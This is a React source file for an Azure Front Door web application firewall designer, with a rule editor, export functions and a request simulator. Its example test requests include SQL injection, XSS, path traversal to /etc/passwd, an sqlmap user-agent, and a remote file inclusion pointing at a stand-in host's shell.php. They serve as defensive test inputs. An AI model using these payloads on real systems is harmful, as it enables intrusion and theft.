'use client'

import { useState } from 'react'
import Link from 'next/link'
import { Shield, ArrowLeft, Play, FileText, Download, X, Plus, Trash2, AlertTriangle } from 'lucide-react'
import { 
  createSampleAFDPolicy, 
  generateAFDBicepParamFile, 
  exportAFDPolicyToJSON,
  simulateRequest,
  type AFDWAFPolicy,
  type AFDCustomRule,
  type AFDMatchCondition,
  type AFDRuleAction,
  type AFDMatchVariable,
  type AFDOperator,
  type TestRequest,
  type TestResult
} from '@/lib/waf-afd'

// Example Test Requests
const EXAMPLE_REQUESTS: { name: string; description: string; request: TestRequest }[] = [
  {
    name: 'Normal Request',
    description: 'A typical legitimate request',
    request: {
      method: 'GET',
      url: '/api/users?page=1&limit=10',
      headers: { 'User-Agent': 'Mozilla/5.0' },
      queryParams: { page: '1', limit: '10' },
      cookies: {},
      sourceIp: '203.0.113.45'
    }
  },
  {
    name: 'SQL Injection Attempt',
    description: 'Malicious SQL injection in query string',
    request: {
      method: 'GET',
      url: '/api/users?id=1 UNION SELECT * FROM users--',
      headers: { 'User-Agent': 'Mozilla/5.0' },
      queryParams: { id: '1 UNION SELECT * FROM users--' },
      cookies: {},
      sourceIp: '198.51.100.23'
    }
  },
  {
    name: 'XSS Attack',
    description: 'Cross-site scripting attempt',
    request: {
      method: 'GET',
      url: '/search?q=<script>alert("XSS")</script>',
      headers: { 'User-Agent': 'Mozilla/5.0' },
      queryParams: { q: '<script>alert("XSS")</script>' },
      cookies: {},
      sourceIp: '198.51.100.42'
    }
  },
  {
    name: 'Path Traversal',
    description: 'Directory traversal attack',
    request: {
      method: 'GET',
      url: '/files?path=../../etc/passwd',
      headers: { 'User-Agent': 'Mozilla/5.0' },
      queryParams: { path: '../../etc/passwd' },
      cookies: {},
      sourceIp: '198.51.100.67'
    }
  },
  {
    name: 'Suspicious User-Agent',
    description: 'Request with scanner tool user-agent',
    request: {
      method: 'GET',
      url: '/api/users',
      headers: { 'User-Agent': 'sqlmap/1.0' },
      queryParams: {},
      cookies: {},
      sourceIp: '198.51.100.88'
    }
  },
  {
    name: 'Login Brute Force',
    description: 'Multiple login attempts from same IP',
    request: {
      method: 'POST',
      url: '/login',
      headers: { 'User-Agent': 'Mozilla/5.0' },
      queryParams: {},
      cookies: {},
      body: JSON.stringify({ username: 'admin', password: 'test' }),
      sourceIp: '192.0.2.15'
    }
  },
  {
    name: 'Remote File Inclusion',
    description: 'Attempt to include remote file',
    request: {
      method: 'GET',
      url: '/page?template=http://evil.com/shell.php',
      headers: { 'User-Agent': 'Mozilla/5.0' },
      queryParams: { template: 'http://evil.com/shell.php' },
      cookies: {},
      sourceIp: '192.0.2.99'
    }
  },
  {
    name: 'Health Check',
    description: 'Health check probe (should be allowed)',
    request: {
      method: 'GET',
      url: '/health',
      headers: { 'User-Agent': 'HealthCheck/1.0' },
      queryParams: {},
      cookies: {},
      sourceIp: '10.0.0.1'
    }
  }
]

export default function AFDWAFDesignerPage() {
  // Core State
  const [policy, setPolicy] = useState<AFDWAFPolicy>(createSampleAFDPolicy())
  const [activeTab, setActiveTab] = useState<'designer' | 'simulator' | 'preview'>('designer')
  
  // UI State
  const [showAddRuleModal, setShowAddRuleModal] = useState(false)
  const [showAddConditionModal, setShowAddConditionModal] = useState(false)
  const [editingRuleIndex, setEditingRuleIndex] = useState<number | null>(null)
  
  // Test Simulator State
  const [testRequest, setTestRequest] = useState<TestRequest>({
    method: 'GET',
    url: '/api/users?id=1',
    headers: {},
    queryParams: { id: '1' },
    cookies: {},
    sourceIp: '203.0.113.1'
  })
  const [testResults, setTestResults] = useState<TestResult[]>([])
  
  // New Rule State
  const [newRule, setNewRule] = useState<Partial<AFDCustomRule>>({
    name: '',
    priority: 100,
    ruleType: 'MatchRule',
    action: 'Block',
    enabledState: 'Enabled',
    matchConditions: []
  })

  // New Condition State
  const [newCondition, setNewCondition] = useState<Partial<AFDMatchCondition>>({
    matchVariable: 'QueryString',
    operator: 'Contains',
    matchValue: [],
    transforms: ['Lowercase']
  })

  // ====================================
  // HANDLERS  
  // ====================================

  const handleAddRule = () => {
    if (!newRule.name || !newRule.matchConditions || newRule.matchConditions.length === 0) {
      alert('Rule must have a name and at least one match condition')
      return
    }

    const rule: AFDCustomRule = {
      name: newRule.name,
      priority: newRule.priority || 100,
      ruleType: newRule.ruleType || 'MatchRule',
      action: newRule.action || 'Block',
      enabledState: newRule.enabledState || 'Enabled',
      matchConditions: newRule.matchConditions,
      ...(newRule.ruleType === 'RateLimitRule' && {
        rateLimitThreshold: newRule.rateLimitThreshold || 100,
        rateLimitDurationInMinutes: newRule.rateLimitDurationInMinutes || 1
      })
    }

    setPolicy(prev => ({
      ...prev,
      customRules: [...prev.customRules, rule].sort((a, b) => a.priority - b.priority)
    }))

    // Reset form
    setNewRule({
      name: '',
      priority: 100,
      ruleType: 'MatchRule',
      action: 'Block',
      enabledState: 'Enabled',
      matchConditions: []
    })
    setShowAddRuleModal(false)
  }

  const handleAddCondition = () => {
    if (!newCondition.matchVariable || !newCondition.operator || !newCondition.matchValue || newCondition.matchValue.length === 0) {
      alert('Condition must have match variable, operator, and at least one match value')
      return
    }

    const condition: AFDMatchCondition = {
      matchVariable: newCondition.matchVariable,
      operator: newCondition.operator,
      matchValue: newCondition.matchValue,
      ...(newCondition.selector && { selector: newCondition.selector }),
      ...(newCondition.negateCondition && { negateCondition: newCondition.negateCondition }),
      ...(newCondition.transforms && { transforms: newCondition.transforms })
    }

    setNewRule(prev => ({
      ...prev,
      matchConditions: [...(prev.matchConditions || []), condition]
    }))

    // Reset condition form
    setNewCondition({
      matchVariable: 'QueryString',
      operator: 'Contains',
      matchValue: [],
      transforms: ['Lowercase']
    })
    setShowAddConditionModal(false)
  }

  const handleDeleteRule = (index: number) => {
    setPolicy(prev => ({
      ...prev,
      customRules: prev.customRules.filter((_, i) => i !== index)
    }))
  }

  const handleToggleRule = (index: number) => {
    setPolicy(prev => ({
      ...prev,
      customRules: prev.customRules.map((rule, i) => 
        i === index 
          ? { ...rule, enabledState: rule.enabledState === 'Enabled' ? 'Disabled' : 'Enabled' as 'Enabled' | 'Disabled' }
          : rule
      )
    }))
  }

  const handleRunTest = () => {
    const result = simulateRequest(policy, testRequest)
    setTestResults([result, ...testResults])
  }

  const handleExport = (format: 'bicepparam' | 'json') => {
    let content: string
    let filename: string
    let mimeType: string

    if (format === 'bicepparam') {
      content = generateAFDBicepParamFile(policy)
      filename = `${policy.name}.bicepparam`
      mimeType = 'text/plain'
    } else {
      content = JSON.stringify(exportAFDPolicyToJSON(policy), null, 2)
      filename = `${policy.name}.json`
      mimeType = 'application/json'
    }

    const blob = new Blob([content], { type: mimeType })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = filename
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
  }

  // ====================================
  // RENDER
  // ====================================

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 dark:from-gray-900 dark:to-gray-800">
      {/* Header */}
      <div className="border-b bg-white/80 dark:bg-gray-800/80 backdrop-blur-sm border-gray-200 dark:border-gray-700">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center gap-4">
              <Link
                href="/"
                className="flex items-center gap-2 text-gray-600 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors"
              >
                <ArrowLeft className="w-4 h-4" />
                Back
              </Link>
              <div className="h-8 w-px bg-gray-200 dark:bg-gray-700" />
              <Shield className="w-6 h-6 text-blue-600 dark:text-blue-400" />
              <h1 className="text-xl font-bold text-gray-900 dark:text-white">Azure Front Door WAF Designer</h1>
            </div>
            <div className="flex items-center gap-3">
              <button
                onClick={() => handleExport('bicepparam')}
                className="flex items-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 dark:bg-blue-700 dark:hover:bg-blue-600 rounded-lg text-white transition-colors"
              >
                <Download className="w-4 h-4" />
                Export Bicep
              </button>
              <button
                onClick={() => handleExport('json')}
                className="flex items-center gap-2 px-4 py-2 bg-gray-600 hover:bg-gray-700 dark:bg-gray-700 dark:hover:bg-gray-600 rounded-lg text-white transition-colors"
              >
                <FileText className="w-4 h-4" />
                Export JSON
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Tabs */}
      <div className="border-b border-gray-200 dark:border-gray-700 bg-white/50 dark:bg-gray-800/50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex gap-1">
            {(['designer', 'simulator', 'preview'] as const).map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`px-6 py-3 font-medium transition-colors capitalize ${
                  activeTab === tab
                    ? 'text-blue-600 dark:text-blue-400 border-b-2 border-blue-600 dark:border-blue-400'
                    : 'text-gray-600 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white'
                }`}
              >
                {tab}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {activeTab === 'designer' && (
          <div className="space-y-6">
            {/* Policy Settings */}
            <div className="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 p-6 shadow-sm">
              <h2 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">Policy Settings</h2>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Policy Name</label>
                  <input
                    type="text"
                    value={policy.name}
                    onChange={(e) => setPolicy(prev => ({ ...prev, name: e.target.value }))}
                    className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">SKU</label>
                  <select
                    value={policy.sku}
                    onChange={(e) => {
                      const newSku = e.target.value as 'Standard_AzureFrontDoor' | 'Premium_AzureFrontDoor'
                      setPolicy(prev => ({
                        ...prev,
                        sku: newSku,
                        // Clear managed rules if switching to Standard
                        managedRules: newSku === 'Standard_AzureFrontDoor' 
                          ? { managedRuleSets: [] }
                          : prev.managedRules
                      }))
                    }}
                    className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                  >
                    <option value="Standard_AzureFrontDoor">Standard</option>
                    <option value="Premium_AzureFrontDoor">Premium</option>
                  </select>
                  {policy.sku === 'Standard_AzureFrontDoor' && (
                    <p className="mt-1 text-xs text-amber-600 dark:text-amber-400">
                      ⓘ Managed Rules require Premium SKU
                    </p>
                  )}
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Mode</label>
                  <select
                    value={policy.policySettings.mode}
                    onChange={(e) => setPolicy(prev => ({
                      ...prev,
                      policySettings: { ...prev.policySettings, mode: e.target.value as any }
                    }))}
                    className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                  >
                    <option value="Detection">Detection</option>
                    <option value="Prevention">Prevention</option>
                  </select>
                </div>
              </div>
            </div>

            {/* Custom Rules */}
            <div className="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 p-6 shadow-sm">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg font-semibold text-gray-900 dark:text-white">Custom Rules</h2>
                <button
                  onClick={() => setShowAddRuleModal(true)}
                  className="flex items-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 dark:bg-blue-700 dark:hover:bg-blue-600 rounded-lg text-white transition-colors"
                >
                  <Plus className="w-4 h-4" />
                  Add Rule
                </button>
              </div>

              <div className="space-y-3">
                {policy.customRules.map((rule, index) => (
                  <div key={index} className="bg-gray-50 dark:bg-gray-900 rounded-lg border border-gray-200 dark:border-gray-700 p-4">
                    <div className="flex items-start justify-between">
                      <div className="flex-1">
                        <div className="flex items-center gap-3 mb-2">
                          <h3 className="font-medium text-gray-900 dark:text-white">{rule.name}</h3>
                          <span className="px-2 py-1 text-xs rounded bg-blue-100 dark:bg-blue-900 text-blue-700 dark:text-blue-300">
                            Priority: {rule.priority}
                          </span>
                          <span className={`px-2 py-1 text-xs rounded ${
                            rule.action === 'Block' ? 'bg-red-100 dark:bg-red-900 text-red-700 dark:text-red-300' :
                            rule.action === 'Allow' ? 'bg-green-100 dark:bg-green-900 text-green-700 dark:text-green-300' :
                            'bg-blue-100 dark:bg-blue-900 text-blue-700 dark:text-blue-300'
                          }`}>
                            {rule.action}
                          </span>
                          <span className={`px-2 py-1 text-xs rounded ${
                            rule.enabledState === 'Enabled' ? 'bg-green-100 dark:bg-green-900 text-green-700 dark:text-green-300' : 'bg-gray-100 dark:bg-gray-700 text-gray-600 dark:text-gray-300'
                          }`}>
                            {rule.enabledState}
                          </span>
                        </div>
                        <div className="text-sm text-gray-600 dark:text-gray-400">
                          {rule.matchConditions.length} condition{rule.matchConditions.length !== 1 ? 's' : ''}
                          {rule.ruleType === 'RateLimitRule' && ` • Rate Limit: ${rule.rateLimitThreshold}/min`}
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <button
                          onClick={() => handleToggleRule(index)}
                          className="p-2 hover:bg-gray-100 dark:hover:bg-gray-700 rounded-lg transition-colors"
                        >
                          <Shield className={`w-4 h-4 ${rule.enabledState === 'Enabled' ? 'text-green-600 dark:text-green-400' : 'text-gray-400'}`} />
                        </button>
                        <button
                          onClick={() => handleDeleteRule(index)}
                          className="p-2 hover:bg-red-100 dark:hover:bg-red-900/30 rounded-lg transition-colors"
                        >
                          <Trash2 className="w-4 h-4 text-red-600 dark:text-red-400" />
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
                {policy.customRules.length === 0 && (
                  <div className="text-center py-8 text-gray-500 dark:text-gray-400">
                    No custom rules defined. Click "Add Rule" to get started.
                  </div>
                )}
              </div>
            </div>

            {/* Managed Rules - Premium SKU Only */}
            {policy.sku === 'Premium_AzureFrontDoor' && (
              <div className="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 p-6 shadow-sm">
                <h2 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">Managed Rule Sets</h2>
              <div className="space-y-3">
                {policy.managedRules.managedRuleSets.map((ruleSet, index) => (
                  <div key={index} className="bg-gray-50 dark:bg-gray-900 rounded-lg border border-gray-200 dark:border-gray-700 p-4">
                    <div className="flex items-center justify-between">
                      <div>
                        <h3 className="font-medium text-gray-900 dark:text-white">{ruleSet.ruleSetType}</h3>
                        <p className="text-sm text-gray-600 dark:text-gray-400">Version {ruleSet.ruleSetVersion}</p>
                      </div>
                      <span className="px-3 py-1 text-sm rounded bg-blue-100 dark:bg-blue-900 text-blue-700 dark:text-blue-300">
                        {ruleSet.ruleSetAction || 'Block'}
                      </span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
            )}
          </div>
        )}

        {activeTab === 'simulator' && (
          <div className="space-y-6">
            {/* Test Request Configuration */}
            <div className="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 p-6 shadow-sm">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg font-semibold text-gray-900 dark:text-white">Test Request</h2>
                <div className="flex items-center gap-2">
                  <label className="text-sm text-gray-600 dark:text-gray-400">Example:</label>
                  <select
                    onChange={(e) => {
                      const example = EXAMPLE_REQUESTS.find(r => r.name === e.target.value)
                      if (example) {
                        setTestRequest(example.request)
                      }
                    }}
                    className="px-3 py-1 text-sm bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                  >
                    <option value="">Load Example...</option>
                    {EXAMPLE_REQUESTS.map((example) => (
                      <option key={example.name} value={example.name}>
                        {example.name}
                      </option>
                    ))}
                  </select>
                </div>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Method</label>
                  <select
                    value={testRequest.method}
                    onChange={(e) => setTestRequest(prev => ({ ...prev, method: e.target.value as any }))}
                    className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                  >
                    <option value="GET">GET</option>
                    <option value="POST">POST</option>
                    <option value="PUT">PUT</option>
                    <option value="DELETE">DELETE</option>
                  </select>
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">URL</label>
                  <input
                    type="text"
                    value={testRequest.url}
                    onChange={(e) => setTestRequest(prev => ({ ...prev, url: e.target.value }))}
                    className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                    placeholder="/api/users?id=1"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Source IP</label>
                  <input
                    type="text"
                    value={testRequest.sourceIp}
                    onChange={(e) => setTestRequest(prev => ({ ...prev, sourceIp: e.target.value }))}
                    className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                    placeholder="203.0.113.1"
                  />
                </div>
                <div className="md:col-span-2">
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Request Body (optional)</label>
                  <textarea
                    value={testRequest.body || ''}
                    onChange={(e) => setTestRequest(prev => ({ ...prev, body: e.target.value }))}
                    className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                    placeholder='{"username": "test", "password": "test123"}'
                    rows={3}
                  />
                </div>
              </div>
              <button
                onClick={handleRunTest}
                className="flex items-center gap-2 px-6 py-3 bg-blue-600 hover:bg-blue-700 dark:bg-blue-700 dark:hover:bg-blue-600 rounded-lg text-white font-medium transition-colors"
              >
                <Play className="w-4 h-4" />
                Run Test
              </button>
            </div>

            {/* Test Results */}
            <div className="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 p-6 shadow-sm">
              <h2 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">Test Results</h2>
              <div className="space-y-3">
                {testResults.map((result, index) => (
                  <div key={index} className={`bg-gray-50 dark:bg-gray-900 rounded-lg border p-4 ${
                    result.allowed ? 'border-green-300 dark:border-green-700' : 'border-red-300 dark:border-red-700'
                  }`}>
                    <div className="flex items-start justify-between mb-2">
                      <div className="flex items-center gap-3">
                        {result.allowed ? (
                          <div className="w-8 h-8 rounded-full bg-green-100 dark:bg-green-900 flex items-center justify-center">
                            <span className="text-green-600 dark:text-green-400 text-lg">✓</span>
                          </div>
                        ) : (
                          <div className="w-8 h-8 rounded-full bg-red-100 dark:bg-red-900 flex items-center justify-center">
                            <AlertTriangle className="w-5 h-5 text-red-600 dark:text-red-400" />
                          </div>
                        )}
                        <div>
                          <div className={`font-medium ${result.allowed ? 'text-green-600 dark:text-green-400' : 'text-red-600 dark:text-red-400'}`}>
                            {result.allowed ? 'Allowed' : 'Blocked'} - {result.action}
                          </div>
                          <div className="text-sm text-gray-600 dark:text-gray-400">{result.details}</div>
                        </div>
                      </div>
                      <span className="text-xs text-gray-500 dark:text-gray-400">{new Date(result.timestamp).toLocaleTimeString()}</span>
                    </div>
                    {result.matchedRule && (
                      <div className="mt-2 text-sm text-gray-600 dark:text-gray-400 pl-11">
                        Matched Rule: <span className="text-blue-600 dark:text-blue-400">{result.matchedRule.name}</span> (Priority: {result.matchedRule.priority})
                      </div>
                    )}
                  </div>
                ))}
                {testResults.length === 0 && (
                  <div className="text-center py-8 text-gray-500 dark:text-gray-400">
                    No test results yet. Run a test to see results.
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {activeTab === 'preview' && (
          <div className="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 p-6 shadow-sm">
            <h2 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">Bicep Parameters Preview</h2>
            <pre className="bg-gray-900 dark:bg-black rounded-lg p-4 text-sm text-green-400 overflow-x-auto">
              {generateAFDBicepParamFile(policy)}
            </pre>
          </div>
        )}
      </div>

      {/* Add Rule Modal */}
      {showAddRuleModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50">
          <div className="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 max-w-2xl w-full max-h-[90vh] overflow-y-auto shadow-xl">
            <div className="sticky top-0 bg-white dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700 p-6 flex items-center justify-between">
              <h3 className="text-xl font-semibold text-gray-900 dark:text-white">Add Custom Rule</h3>
              <button
                onClick={() => setShowAddRuleModal(false)}
                className="p-2 hover:bg-gray-100 dark:hover:bg-gray-700 rounded-lg transition-colors"
              >
                <X className="w-5 h-5 text-gray-600 dark:text-gray-400" />
              </button>
            </div>
            <div className="p-6 space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Rule Name</label>
                <input
                  type="text"
                  value={newRule.name}
                  onChange={(e) => setNewRule(prev => ({ ...prev, name: e.target.value }))}
                  className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                  placeholder="BlockMaliciousTraffic"
                />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Priority</label>
                  <input
                    type="number"
                    value={newRule.priority}
                    onChange={(e) => setNewRule(prev => ({ ...prev, priority: parseInt(e.target.value) }))}
                    className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Action</label>
                  <select
                    value={newRule.action}
                    onChange={(e) => setNewRule(prev => ({ ...prev, action: e.target.value as AFDRuleAction }))}
                    className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                  >
                    <option value="Block">Block</option>
                    <option value="Allow">Allow</option>
                    <option value="Log">Log</option>
                    <option value="Redirect">Redirect</option>
                  </select>
                </div>
              </div>

              <div className="border-t border-gray-200 dark:border-gray-700 pt-4">
                <div className="flex items-center justify-between mb-3">
                  <h4 className="text-sm font-medium text-gray-900 dark:text-white">Match Conditions</h4>
                  <button
                    onClick={() => setShowAddConditionModal(true)}
                    className="flex items-center gap-2 px-3 py-1 bg-blue-600 hover:bg-blue-700 dark:bg-blue-700 dark:hover:bg-blue-600 rounded text-white text-sm transition-colors"
                  >
                    <Plus className="w-3 h-3" />
                    Add Condition
                  </button>
                </div>
                <div className="space-y-2">
                  {(newRule.matchConditions || []).map((cond, index) => (
                    <div key={index} className="bg-gray-50 dark:bg-gray-900 rounded p-3 text-sm">
                      <div className="text-gray-900 dark:text-white">{cond.matchVariable} {cond.operator} "{cond.matchValue.join(', ')}"</div>
                    </div>
                  ))}
                  {(!newRule.matchConditions || newRule.matchConditions.length === 0) && (
                    <div className="text-center py-4 text-gray-500 dark:text-gray-400 text-sm">
                      No conditions added yet
                    </div>
                  )}
                </div>
              </div>

              <div className="flex gap-3 pt-4 border-t border-gray-200 dark:border-gray-700">
                <button
                  onClick={() => setShowAddRuleModal(false)}
                  className="flex-1 px-4 py-2 bg-gray-100 hover:bg-gray-200 dark:bg-gray-700 dark:hover:bg-gray-600 rounded-lg text-gray-900 dark:text-white transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={handleAddRule}
                  className="flex-1 px-4 py-2 bg-blue-600 hover:bg-blue-700 dark:bg-blue-700 dark:hover:bg-blue-600 rounded-lg text-white font-medium transition-colors"
                >
                  Add Rule
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Add Condition Modal */}
      {showAddConditionModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50">
          <div className="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 max-w-xl w-full shadow-xl">
            <div className="border-b border-gray-200 dark:border-gray-700 p-6 flex items-center justify-between">
              <h3 className="text-xl font-semibold text-gray-900 dark:text-white">Add Match Condition</h3>
              <button
                onClick={() => setShowAddConditionModal(false)}
                className="p-2 hover:bg-gray-100 dark:hover:bg-gray-700 rounded-lg transition-colors"
              >
                <X className="w-5 h-5 text-gray-600 dark:text-gray-400" />
              </button>
            </div>
            <div className="p-6 space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Match Variable</label>
                <select
                  value={newCondition.matchVariable}
                  onChange={(e) => setNewCondition(prev => ({ ...prev, matchVariable: e.target.value as AFDMatchVariable }))}
                  className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                >
                  <option value="QueryString">Query String</option>
                  <option value="RequestUri">Request URI</option>
                  <option value="RequestHeader">Request Header</option>
                  <option value="RequestBody">Request Body</option>
                  <option value="Cookies">Cookies</option>
                  <option value="RequestMethod">Request Method</option>
                  <option value="RemoteAddr">Remote Address</option>
                  <option value="SocketAddr">Socket Address</option>
                  <option value="PostArgs">POST Arguments</option>
                </select>
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Operator</label>
                <select
                  value={newCondition.operator}
                  onChange={(e) => setNewCondition(prev => ({ ...prev, operator: e.target.value as AFDOperator }))}
                  className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                >
                  <option value="Contains">Contains</option>
                  <option value="Equal">Equal</option>
                  <option value="BeginsWith">Begins With</option>
                  <option value="EndsWith">Ends With</option>
                  <option value="RegEx">Regular Expression</option>
                  <option value="IPMatch">IP Match</option>
                  <option value="GeoMatch">Geo Match</option>
                  <option value="Any">Any</option>
                </select>
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Match Values (comma-separated)</label>
                <input
                  type="text"
                  onChange={(e) => setNewCondition(prev => ({ ...prev, matchValue: e.target.value.split(',').map(v => v.trim()).filter(v => v) }))}
                  className="w-full px-3 py-2 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400"
                  placeholder="union, select, drop"
                />
              </div>
              <div className="flex gap-3 pt-4 border-t border-gray-200 dark:border-gray-700">
                <button
                  onClick={() => setShowAddConditionModal(false)}
                  className="flex-1 px-4 py-2 bg-gray-100 hover:bg-gray-200 dark:bg-gray-700 dark:hover:bg-gray-600 rounded-lg text-gray-900 dark:text-white transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={handleAddCondition}
                  className="flex-1 px-4 py-2 bg-blue-600 hover:bg-blue-700 dark:bg-blue-700 dark:hover:bg-blue-600 rounded-lg text-white font-medium transition-colors"
                >
                  Add Condition
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
